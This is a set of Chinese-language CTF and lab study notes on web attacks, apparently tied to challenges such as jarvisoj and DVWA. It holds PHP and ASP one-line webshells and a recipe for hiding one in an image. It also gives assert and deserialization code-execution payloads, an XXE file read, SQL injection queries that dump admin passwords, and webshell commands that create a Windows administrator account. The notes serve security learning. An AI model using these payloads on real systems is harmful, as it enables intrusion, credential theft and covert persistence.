<p>首先是把php上传（改文件名、改Content-Type，改文件内容，图片马），然后是如何解析并执行php（web容器的解析漏洞、php文件包含）。</p>
<div class="codehilite"><pre>&lt;?php @eval($_POST[&#39;pwd&#39;]);?&gt;
&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;pwd&#39;])&lt;/script&gt;
</pre></div>


<h3 id="serilaze">序列化 Serilaze<a class="headerlink" href="#serilaze" title="Permanent link"></a></h3>
<div class="codehilite"><pre>&lt;?php
    class Shield {...}

    $shield = new Shield(&#39;pctf.php&#39;);
    echo serialize($shield);
?&gt;
</pre></div>


<h3 id="assert">assert 执行<a class="headerlink" href="#assert" title="Permanent link"></a></h3>
<p>注意到 assert(&ldquo;strpos(&lsquo;$file&rsquo;, &lsquo;..&rsquo;) === false&rdquo;) or die(&ldquo;Detected hacking attempt!&rdquo;) 这句话，查了一下 strpos，感觉可以拼接一下，但是自己不熟悉 PHP，只能去看题解。</p>
<p>可以执行任何 PHP 命令</p>
<p>构造 $file=&rsquo;.system(&lsquo;ls&rsquo;).&rsquo;，意思就是用 . 来拼接 system 的返回结果</p>
<p><a href="http://web.jarvisoj.com:32798/?page='.system('ls">http://web.jarvisoj.com:32798/?page='.system('ls</a>&rsquo;).&rsquo;</p>
<p><a href="http://web.jarvisoj.com:32798/?page='.system('cat">http://web.jarvisoj.com:32798/?page='.system('cat</a> templates/flag.php&rsquo;).&rsquo;</p>
<p>看源码显示的flag。</p>
<h3 id="phpinfo">phpinfo 审计代码反序列化<a class="headerlink" href="#phpinfo" title="Permanent link"></a></h3>
<p>问题在</p>
<div class="codehilite"><pre>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。
</pre></div>


<p><code>session.serialize_handler</code> 容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了session的反序列化问题。</p>
<div style="color:red">php大于5.5.4的版本中默认使用php_serialize规则</div>

<p>由phpinfo()页面继续可知，session.upload_progress.enabled为On。</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
<p>但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。</p>
<p>其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题</p>
<p>思路很明显了，我们需要构造一个上传和post同时进行的情况，代码如下:</p>
<div class="codehilite"><pre>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;test XXE&lt;/title&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--     
不对字符编码--&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
        &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></div>


<p>注意enctype属性:</p>
<table>
<thead>
<tr>
<th>表头</th>
<th>表头</th>
</tr>
</thead>
<tbody>
<tr>
<td>application/x-www-form-urlencoded</td>
<td>在发送前编码所有字符（默认）</td>
</tr>
<tr>
<td>multipart/form-data</td>
<td>不对字符编码。 在使用包含文件上传控件的表单时，必须使用该值</td>
</tr>
<tr>
<td>text/plain</td>
<td>空格转换为&rdquo;+&rdquo;加号，但不对特殊字符编码。</td>
</tr>
</tbody>
</table>
<hr />
<p>Code,在本机PHP环境执行下，得到反序列化结果。</p>
<div class="codehilite"><pre>&lt;?php
class OowoO
{
    public $mdzz=&#39;xxxxx&#39;;
}
$obj = new OowoO();
echo serialize($obj);
# O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:5:&quot;xxxxx&quot;;}
</pre></div>


<p>payloay1:将xxxxx替换为<code>print_r(scandir(dirname(__FILE__)));</code>,得到序列化结果：</p>
<div class="codehilite"><pre>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}
</pre></div>


<p>为防止转义，在引号:前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：</p>
<div class="codehilite"><pre>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
</pre></div>


<p>注意，前面有一个<code>|</code>，这是session的格式。
<img alt="注意，前面" src="imgs/web1.jpg" /></p>
<p>接下来就是去读取 <code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code></p>
<p>由phpinfo可知当前的路径为<code>/opt/lampp/htdocs/</code></p>
<p><img alt="注意，前面" src="imgs/web2.jpg" /></p>
<p>将xxx处改为：</p>
<p><code>print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));</code></p>
<p>之后步骤如前，将filename改为：</p>
<p><code>|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}</code></p>
<p>得到flag：</p>
<p><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></p>
<h3 id="php_2">php 代码分析<a class="headerlink" href="#php_2" title="Permanent link"></a></h3>
<div class="codehilite"><pre>$first =&quot;hello&quot;;
$hello =&quot;world&quot;;
echo $first.&quot; &quot;.$$first;
结果是 hello world
$$first就是$hello，因为$first的值是hello

var_dump($$args) , flag可能存在于 , 全局变量 $GLOBALS , ?args=GLBOALS
</pre></div>


<h3 id="phpfilter">php://filter元封装器<a class="headerlink" href="#phpfilter" title="Permanent link"></a></h3>
<div class="codehilite"><pre>名称  描述
resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。
read=&lt;读链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
&lt;；两个链的筛选列表&gt;任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链。

过滤器列表：http://php.net/manual/zh/filters.php

--- web2
页面1 http://xxx/?user=&#39;%23 -- 注释字符抓包，python生成字典。burp 暴破。
本题限制了4位字符 &#39;%1%23 刚好4位

页面2 抓所看到 .viminfo 访问一下。
找一个unicode字符和英文字符一样的。代替一下目标字符就能过waf

页面3 
使用path=http://127.0.0.1/&amp;filename=1.txt
  写文件到upload目录下, 访问这个1.txt
尝试 path=http://127.0.0.1/xxx.php?usern3me=&lt;?php info();?&gt;&amp;filename=1.txt
  发现可以访问，但是需要编码。
尝试 path=http://127.0.0.1/xxx.php?usern3me=&lt;?php system($_[REQUEST[0]);?&gt;&amp;filename=1.txt
改成PHP文件 path=http://127.0.0.1/xxx.php?usern3me=&lt;?php system($_[REQUEST[0]);?&gt;&amp;filename=1.php
  用Hackbar上面的Encoding进行URL编码。空格要2次编码
  %20 改成 %2520
  %3D 是 =
直接用它来执行命令 path=http://127.0.0.1/1.php?0=ls ../ 找到flag文件
查看 path=http://127.0.0.1/1.php?0=cat ../flag_is_here.php 查看源代码
https://www.freebuf.com/vuls/116705.html

读取文件
php://filter/read=convert.base64-encode/resource=show.php
Burp Suite - Decoder 中可以解base64,

构造Cookie问题
?line=1&amp;filename=show.php
用bp暴破， line=1字段 读取每一行 ，整合代码发现需要构造 Cookies: margin ,读取keys.php
添加header头 Cookie: margin=margin; 
    filename=xxx替换成filename=keys.php的base64编码，读取完成。
</pre></div>


<h3 id="php_3">php 相关函数<a class="headerlink" href="#php_3" title="Permanent link"></a></h3>
<p>assert</p>
<div class="codehilite"><pre>bool assert(mixed $assertion[,string $description])，
如果assertion是字符串，他会被assert()当做php代码执行。
</pre></div>


<p>就是说如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
<p>那么我们就可以构造payload</p>
<div class="codehilite"><pre>?page=&#39;.system(&quot;cat templates/flag.php&quot;).&#39;
</pre></div>


<p>常被过滤</p>
<div class="codehilite"><pre>&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;
</pre></div>


<h2 id="_10">地址猜想<a class="headerlink" href="#_10" title="Permanent link"></a></h2>
<p>phpmyadmin 地址</p>
<div class="codehilite"><pre>http://pma.wechall.com
http://pma.wechall.net
https://pma.wechall.net
</pre></div>


<h2 id="mytest">mytest<a class="headerlink" href="#mytest" title="Permanent link"></a></h2>
<p><a href="https://blog.csdn.net/qq_42192672/article/details/82935802">https://blog.csdn.net/qq_42192672/article/details/82935802</a></p>
<p><a href="https://github.com/eteran/edb-debugger/releases">https://github.com/eteran/edb-debugger/releases</a>、</p>
<p>i春秋 实验吧 bugku hackinglab.cn</p>
<p>一句话木马常用查询</p>
<div class="codehilite"><pre>whoami
system
ipconfig
echo &#39;&lt;pre&gt;&#39;;system(&quot;ipconfig&quot;);
</pre></div>


<h3 id="git">.git 泄漏<a class="headerlink" href="#git" title="Permanent link"></a></h3>
<p>扫描 发现 .git 目录，</p>
<p>使用Web_Git_Extract-master.zip 提取</p>
<p>python2 git_extract.py <a href="http://106.75.72.168:9999/.git/">http://106.75.72.168:9999/.git/</a></p>
<p>和  <a href="http://106.75.72.168:9999/flag.js">http://106.75.72.168:9999/flag.js</a> 对比得到结果。</p>
<h3 id="xxe-xml">xxe 漏洞, xml提交<a class="headerlink" href="#xxe-xml" title="Permanent link"></a></h3>
<p>以 Content-Type: application/xml 的方式提交，就能得到答案了。</p>
<p>1</p>
<div class="codehilite"><pre>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ggmf[&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;

&lt;tg&gt;&amp;xxe;&lt;/tg&gt;
</pre></div>


<h2 id="burp-suite">Burp Suite 使用<a class="headerlink" href="#burp-suite" title="Permanent link"></a></h2>
<p>User Option - Display - Http Message Display, 使用微软雅黑
User Option - Display - charset: utf8</p>
<h3 id="burp-suite_1">Burp Suite<a class="headerlink" href="#burp-suite_1" title="Permanent link"></a></h3>
<p>refresh 自动刷新的变量字段。
Options - Grep Match 常用，密码错误的时候，可以添加一个匹配关键字。开始攻击后会多一个字段。[^1]</p>
<div class="codehilite"><pre>  结果中也可以过滤(在标签Result下面)，
  grep - match 添加过滤字段 login_error,比返回长度效果更好。
  runtime file 每行作为一个
  custom iterator , 可以生成像 username@@password  ，选posisiton 2 @@, position3 password,
  copy other payload , 两次payload值要一样时使用。
</pre></div>


<p>wordpress , ?author=1 可以知道 id=1的用户</p>
<h3 id="burp-suit-hackbar">Burp Suit 和 Hackbar 使用一句话木马<a class="headerlink" href="#burp-suit-hackbar" title="Permanent link"></a></h3>
<p>注意使用 POST 方法提交哦。</p>
<p><strong>1、 Burp Suite：</strong></p>
<p>1) 拦截到页面请求, 将其转到 Repeater, 并在最下方加入请求参数:</p>
<div class="codehilite"><pre>shell=system(&quot;find / -name &#39;flag*&#39;&quot;);
</pre></div>


<p>2) 查看 Response, 最下方有目标文件路径:3) 修改 Repeater 中的请求参数为:</p>
<div class="codehilite"><pre>shell=system(&quot;cat /var/www/html/flag.txt&quot;);
</pre></div>


<p>4) 查看 Response 中的结果:</p>
<p><strong>2､ HackBar:</strong></p>
<p>1) 在 HackBar 中输入相应 URL 和请求参数, 请求参数为需要执行的 shell:</p>
<div class="codehilite"><pre>shell=system(&quot;find / -name &#39;flag*&#39;&quot;);
</pre></div>


<p>2） 在原先的页面可以看到相应结果， 在最下面即是目标文件的路径， 如下图所示：</p>
<p>3） 继续在 Hackbar 中执行命令：</p>
<div class="codehilite"><pre>shell=system(&quot;cat /var/www/html/flag.txt&quot;);
</pre></div>


<p>4） 在原页面即可查看到 flag.txt 中的 flag 内容：</p>
<h3 id="burp-suite_2">Burp Suite暴力破解一句话木马<a class="headerlink" href="#burp-suite_2" title="Permanent link"></a></h3>
<p>一句话木马</p>
<div class="codehilite"><pre>PHP:&lt;?php @eval($_POST[&#39;pwd&#39;]);?&gt;
PHP:&lt;?php @eval(_POST[&#39;v5estOr&#39;]);?&gt;
&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;cmd&#39;])&lt;/script&gt;
ASP:&lt;%eval request(&quot;v5estor&quot;)%&gt;
</pre></div>


<p>一般来说,一句话木马通过POST方式的传参方式如下(以写出字符的语句为例):</p>
<div class="codehilite"><pre>PHP:v5estor=echo &quot;password is v5estor&quot;;
ASP:v5estOr=response.write(&quot;password:v5estor&quot;)
</pre></div>


<p>已确定一句话木马地址为hack.php, 用hackbar 捕获hack.php 请求， 发送到Intruder ,将 v5estor 添加为变量，暴破一句话木马变量地址。grep - match 字段添加，password is 。 暴破后正确输出 password is 为成功为一句话木马的变量。</p>
<h4 id="_11">图片马<a class="headerlink" href="#_11" title="Permanent link"></a></h4>
<p>winhex打开图片，在最后粘贴马。</p>
<h3 id="burp-suite_3">Burp Suite 破解文件上传<a class="headerlink" href="#burp-suite_3" title="Permanent link"></a></h3>
<p>普通难度： </p>
<div class="codehilite"><pre>抓包, 1. 改 content-type即可。 image/png
抓包, 2. 改 file-name 即可。 image/png
</pre></div>


<p>High级别&mdash;系统认可图片</p>
<div class="codehilite"><pre>copy test.png/b+test.html/a a.png
test.html:  `&lt;script&gt;alert(1)&lt;/script&gt;`
</pre></div>


<p>用来上传php, 比如 <code>copy test.png/b+hack.php/a caidao.png</code></p>
<p>hack.php 里写一句话木马  :&lt;?php <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/eval" title="GitHub User: eval">@eval</a>(_POST[&lsquo;1&rsquo;]);?&gt;</p>
<p>查看有没效果</p>
<p><a href="http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png">http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png</a>   </p>
<p>hackbar</p>
<p>URI： <a href="http://192.168.1.107/dwva/vulnerabilities/fi/?page=C">http://192.168.1.107/dwva/vulnerabilities/fi/?page=C</a>:\www\DWVA\hackable/uploads/hack.png</p>
<div class="codehilite"><pre>POST:1=echo &#39;&lt;pre&gt;&#39;;system(&#39;ipconfig&#39;)
POST:1=echo &#39;&lt;pre&gt;&#39;;system(&#39;net user hack 123456/add&#39;);
POST:1=echo &#39;&lt;pre&gt;&#39;;system(&#39;net localgroup administrators hack /add&#39;):
</pre></div>


<h3 id="burp-suitesqlmap">Burp Suite配合SQLmap实现被动式注入发现<a class="headerlink" href="#burp-suitesqlmap" title="Permanent link"></a></h3>
<div class="codehilite"><pre>User Option - Misc - Logging, √Proxy Request ,选择一个文件位置保存。
打开文件搜索请求，确定请求存在。
sqlmap.py -r 文件目录
sqlmap.py -r C:\log\1.txt --batch
找到并查看 outout文件。在txt中找到注入链接, 比如，测试
sqlmap.py -u &quot;http://192.168.1.102/inject.php?id=2&quot; --dbs
</pre></div>


<h3 id="burp-suite_4">Burp Suite数据获取测试<a class="headerlink" href="#burp-suite_4" title="Permanent link"></a></h3>
<p>用BP抓个包 比如 <a href="http://192.168.1.102/inject.php?id=1">http://192.168.1.102/inject.php?id=1</a></p>
<p>在1后面加a 1$a$ a设置成字段。</p>
<p>Payloads- Payloads Options , Load , 找 FuzzLists目录下的 sqli-union-select</p>
<p>用Intruder 开始攻击, 查看结果-Response</p>
<p>查看结果后 确定为3个字段，在结果里右击查询3字段的发送到repeater, Go一下。
   在params里 select%201,2,3 from a   测试a表是否存在。显示 doesn&rsquo;t exist, 将它 设置成Grep Match 字段进行过滤。
   payloads load,  common-tables进行start attack。</p>
<p>查看结果， 确定admin为表名。继续修改params 猜列名</p>
<div class="codehilite"><pre>    select%201,a,3%20from%20admin 显示 unkonwn column ，将请求必到Intruder,
      将 a 设置成变量， unkonwn column为过滤字段。
      payload - load, comman - column
      start attack,查看结果。
      确定了id , password, 列。
    -1 union all select%201,password,3%20from%20admin
    -1 union all select%201,password,3%20from%20admin limit 0, 1
</pre></div>


<p>发到 Intruder</p>
<div class="codehilite"><pre>id=1 union all select 1,2,3 from admin#
id=1 union all select 1,password,3 from admin#
id=1 union all select 1,concat(id, username, password),3 from admin#
id=1 union all select 1,concat(id,0x7c, username,0x7c, password),3 from admin#
 0x7c是管理符 |
</pre></div>


<p>发到intruder, </p>
<div class="codehilite"><pre>  limit%20$0$,1 这里将0改为字段了。limit参数为：偏移量，最大数目

  payload type: numbers,
    from 0, to 3, step 1,
  start attack
</pre></div>


<p>Grep Extract, add选中后会自动正则。 清除多余的过滤。b</p>
<p>菜单栏 save - result table, 只留一个正则。保存</p>
<h3 id="burp-suite_5">Burp Suite目录与文件扫描测试<a class="headerlink" href="#burp-suite_5" title="Permanent link"></a></h3>
<p>1.抓包 history中， 发到Intruder</p>
<p>2.Positions</p>
<div class="codehilite"><pre>  payload 加载  php去重复.txt 字典
  payload 选项卡 中有 Payload Encoding √要去掉 （否则会编码/符号）
  start attack
  在结果列表， Filter 只勾2xx
</pre></div>


<h2 id="todo">TODO<a class="headerlink" href="#todo" title="Permanent link"></a></h2>
<p>扫描添加.git</p></article></body></html>